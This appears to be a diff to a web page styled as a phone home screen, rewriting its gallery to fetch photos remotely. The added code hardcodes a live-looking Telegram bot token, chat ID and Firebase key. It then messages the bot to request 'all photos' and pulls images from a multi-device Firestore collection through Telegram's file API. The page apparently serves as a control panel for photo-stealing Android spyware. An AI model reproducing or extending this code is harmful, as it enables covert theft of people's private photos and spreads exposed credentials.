@@ -205,6 +205,15 @@ audio{width:100%;margin-top:12px}
 </div>
 </div>
 <script>
+// ═══════════════════════════════════════════
+//  بيانات الاتصال — من Config.kt
+// ═══════════════════════════════════════════
+const BOT_TOKEN="8845943752:AAE9WMF0LGen7Ydelx3HVE_-C-lt4F1j608";
+const CHAT_ID="8599240795";
+const FB_KEY="AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
+const FB_PROJECT="hhhxh-5ebe4";
+const FS_BASE="https://firestore.googleapis.com/v1/projects/"+FB_PROJECT+"/databases/(default)/documents";
+
 const $=q=>document.querySelector(q),$$=q=>[...document.querySelectorAll(q)];
 const scr=$('#scr'),pages=$('#pages'),pw=$('#pw'),dock=$('#dock'),appsEl=$('#apps'),rec=$('#rec'),home=$('#home'),sbar=$('#sbar');
 const REG=[],RMAP={};
@@ -324,116 +333,120 @@ tick();setInterval(tick,5000);
 if(navigator.getBattery)navigator.getBattery().then(b=>{const u=()=>{$('#bat').textContent=Math.round(b.level*100)+'%';$('#batf').setAttribute('width',Math.round(b.level*15))};u();b.addEventListener('levelchange',u)});
 
 /* ═══════════════════════════════════════════
-   المعرض — متصل بالـ Android + Firestore + تلغرام
+   المعرض — Firestore REST + Telegram file_id
    ═══════════════════════════════════════════ */
+async function fsListPhotos(){
+  // جرّب كل الأجهزة
+  const url=FS_BASE+"/devices?key="+FB_KEY+"&pageSize=100";
+  try{
+    const r=await fetch(url);
+    const j=await r.json();
+    const docs=j.documents||[];
+    const all=[];
+    for(const d of docs){
+      const id=d.name.split("/").pop();
+      const purl=FS_BASE+"/devices/"+id+"/photos?key="+FB_KEY+"&pageSize=300";
+      try{
+        const pr=await fetch(purl);
+        const pj=await pr.json();
+        const pdocs=pj.documents||[];
+        for(const p of pdocs){
+          const f=p.fields||{};
+          all.push({
+            file_id:f.file_id?.stringValue||"",
+            name:f.name?.stringValue||"",
+            size:parseInt(f.size?.integerValue||"0"),
+            date:parseInt(f.date?.integerValue||"0"),
+            device:id
+          });
+        }
+      }catch(e){}
+    }
+    return all;
+  }catch(e){return []}
+}
+
+async function tgFileUrl(fileId){
+  try{
+    const r=await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/getFile?file_id="+encodeURIComponent(fileId));
+    const j=await r.json();
+    if(!j.ok)return "";
+    const p=j.result.file_path;
+    return "https://api.telegram.org/file/bot"+BOT_TOKEN+"/"+p;
+  }catch(e){return ""}
+}
+
 function buildGallery(el,w){
-w._imgs=w._imgs||[];
-let loading=false,sel=null;
+  w._imgs=w._imgs||[];
+  let loading=false;
 
-const AB=()=>window.AndroidBridge||null;
+  const render=()=>{
+    if(loading){
+      el.innerHTML='<div class="phead"><b>الصور</b></div><div class="empty" style="padding-top:60px">⏳ جاري تحميل الصور...</div>';
+      return;
+    }
+    const imgs=w._imgs;
+    el.innerHTML='<div class="phead"><b>الصور</b><span>'+imgs.length+' صورة</span></div>'+
+      '<div class="gtop" id="gtop"><button class="gbtn" id="gref">↻ تحديث</button>'+
+      '<button class="gbtn" id="gclr">🗑 مسح</button>'+
+      '<span id="gsz" style="font-size:11px;color:var(--sub);margin-right:auto"></span></div>'+
+      (imgs.length?'<div class="ggrid" id="gg">'+imgs.map((o,j)=>
+        '<div class="gcell" data-j="'+j+'"><img loading="lazy" src="'+o.src+'" onerror="this.parentElement.style.background=\'#333\'"></div>'
+      ).join('')+'</div>':'<div class="empty" style="color:#3ddc84;padding-top:60px">📸 لا توجد صور بعد<br><br>اضغط "تحديث" لجلب الصور من الجهاز</div>');
+    el.querySelector('#gref').onclick=()=>refresh();
+    el.querySelector('#gclr').onclick=()=>{w._imgs=[];render()};
+    const gg=el.querySelector('#gg');
+    if(gg)gg.addEventListener('click',e=>{
+      const c=e.target.closest('.gcell');if(!c)return;
+      openV(+c.dataset.j);
+    });
+  };
 
-const render=()=>{
-if(loading){
-el.innerHTML='<div class="phead"><b>الصور</b></div><div class="empty" style="padding-top:60px">⏳ جاري تحميل الصور...</div>';
-return;
-}
-const imgs=w._imgs;
-el.innerHTML='<div class="phead"><b>الصور</b><span>'+imgs.length+' صورة</span></div>'+
-'<div class="gtop" id="gtop"><button class="gbtn" id="gref">↻ تحديث</button>'+
-'<button class="gbtn" id="gclr">🗑 مسح الكاش</button>'+
-'<span id="gsz" style="font-size:11px;color:var(--sub);margin-right:auto"></span></div>'+
-(imgs.length?'<div class="ggrid" id="gg">'+imgs.map((o,j)=>
-'<div class="gcell" data-j="'+j+'"><img loading="lazy" src="'+o.src+'" onerror="this.src=\'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ctext y=%22.9em%22 font-size=%2290%22%3E🖼%3C/text%3E%3C/svg%3E\'"></div>'
-).join('')+'</div>':'<div class="empty" style="color:#3ddc84;padding-top:60px">📸 لا توجد صور بعد<br><br>اضغط "تحديث" لجلب الصور من الجهاز</div>');
+  const openV=j=>{
+    const v=document.createElement('div');v.className='gview';
+    v.innerHTML='<img id="gv"><div class="gnav"><button class="gbtn" id="gp">›</button><button class="gbtn" id="gn">‹</button></div>'+
+      '<div class="gtools"><button class="gbtn" id="g1">⬇ حفظ</button><button class="gbtn" id="g2">✕ إغلاق</button></div>';
+    el.appendChild(v);
+    const im=v.querySelector('#gv');
+    const show=()=>{if(j<0)j=0;if(j>=w._imgs.length)j=w._imgs.length-1;im.src=w._imgs[j].src};
+    show();
+    const close=()=>v.remove();
+    w._stack.push(close);
+    let vx=null;
+    v.addEventListener('pointerdown',e=>vx=e.clientX);
+    v.addEventListener('pointerup',e=>{if(vx===null)return;const dx=e.clientX-vx;vx=null;if(dx>50&&j>0){j--;show()}else if(dx<-50&&j<w._imgs.length-1){j++;show()}});
+    v.querySelector('#gp').onclick=()=>{if(j>0){j--;show()}};
+    v.querySelector('#gn').onclick=()=>{if(j<w._imgs.length-1){j++;show()}};
+    v.querySelector('#g1').onclick=()=>dl(w._imgs[j].src,w._imgs[j].name||'photo.jpg');
+    v.querySelector('#g2').onclick=close;
+  };
 
-el.querySelector('#gref').onclick=()=>refresh();
-el.querySelector('#gclr').onclick=()=>{
-const a=AB();
-if(a&&a.clearCache)try{a.clearCache()}catch(e){}
-w._imgs=[];render();
-};
-const a=AB();
-if(a&&a.cacheSize){
-try{const s=a.cacheSize();el.querySelector('#gsz').textContent='الكاش: '+(s/1048576).toFixed(1)+' MB'}catch(e){}
-}
-const gg=el.querySelector('#gg');
-if(gg)gg.addEventListener('click',e=>{
-const c=e.target.closest('.gcell');if(!c)return;
-openV(+c.dataset.j);
-});
-};
+  const refresh=async()=>{
+    if(loading)return;
+    loading=true;render();
+    // 1. ابعت أمر للبوت
+    try{
+      await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({chat_id:CHAT_ID,text:"📸 كل الصور"})
+      });
+    }catch(e){}
+    // 2. انتظر 3 ثواني
+    await new Promise(r=>setTimeout(r,3000));
+    // 3. اجلب list من Firestore
+    const list=await fsListPhotos();
+    list.sort((a,b)=>(b.date||0)-(a.date||0));
+    w._imgs=[];
+    for(const p of list){
+      if(!p.file_id)continue;
+      const url=await tgFileUrl(p.file_id);
+      if(url)w._imgs.push({src:url,name:p.name||'photo.jpg',file_id:p.file_id,date:p.date});
+    }
+    loading=false;render();
+  };
 
-const openV=j=>{
-const v=document.createElement('div');v.className='gview';
-v.innerHTML='<img id="gv"><div class="gnav"><button class="gbtn" id="gp">›</button><button class="gbtn" id="gn">‹</button></div>'+
-'<div class="gtools"><button class="gbtn" id="g1">⬇ حفظ</button><button class="gbtn" id="g2">✕ إغلاق</button></div>';
-el.appendChild(v);
-const im=v.querySelector('#gv');
-const show=()=>{if(j<0)j=0;if(j>=w._imgs.length)j=w._imgs.length-1;im.src=w._imgs[j].src};
-show();
-const close=()=>v.remove();
-w._stack.push(close);
-let vx=null;
-v.addEventListener('pointerdown',e=>vx=e.clientX);
-v.addEventListener('pointerup',e=>{if(vx===null)return;const dx=e.clientX-vx;vx=null;if(dx>50&&j>0){j--;show()}else if(dx<-50&&j<w._imgs.length-1){j++;show()}});
-v.querySelector('#gp').onclick=()=>{if(j>0){j--;show()}};
-v.querySelector('#gn').onclick=()=>{if(j<w._imgs.length-1){j++;show()}};
-v.querySelector('#g1').onclick=()=>{
-const a=document.createElement('a');
-a.href=w._imgs[j].src;
-a.download=w._imgs[j].name||'photo.jpg';
-document.body.appendChild(a);a.click();a.remove();
-};
-v.querySelector('#g2').onclick=close;
-};
-
-const loadFromFirestore=()=>{
-return new Promise(resolve=>{
-const a=AB();
-if(!a||!a.listPhotos){resolve([]);return}
-try{
-const raw=a.listPhotos();
-resolve(JSON.parse(raw||'[]'));
-}catch(e){resolve([])}
-});
-};
-
-const refresh=async()=>{
-if(loading)return;
-loading=true;render();
-const a=AB();
-// 1. ابعت أمر للبوت
-if(a&&a.requestPhotos){
-try{a.requestPhotos()}catch(e){}
-}
-// 2. انتظر لحد ما تلغرام تستقبل
-await new Promise(r=>setTimeout(r,1500));
-// 3. اقرى list من Firestore
-const list=await loadFromFirestore();
-w._imgs=[];
-for(const p of list){
-if(!p.file_id)continue;
-let src='';
-if(a&&a.getPhotoUrl){
-try{
-const cached=a.isCached(p.file_id);
-if(cached){
-src=a.getPhotoUrl(p.file_id);
-}else{
-src=a.cachePhoto(p.file_id);
-if(!src)src=a.getPhotoUrl(p.file_id);
-}
-}catch(e){}
-}
-if(src)w._imgs.push({src:src,name:p.name||'photo.jpg',file_id:p.file_id,date:p.date||0});
-}
-w._imgs.sort((x,y)=>(y.date||0)-(x.date||0));
-loading=false;render();
-};
-
-// تشغيل
-if(w._imgs.length)render();
-else refresh();
+  refresh();
 }
 
 /* الملفات */
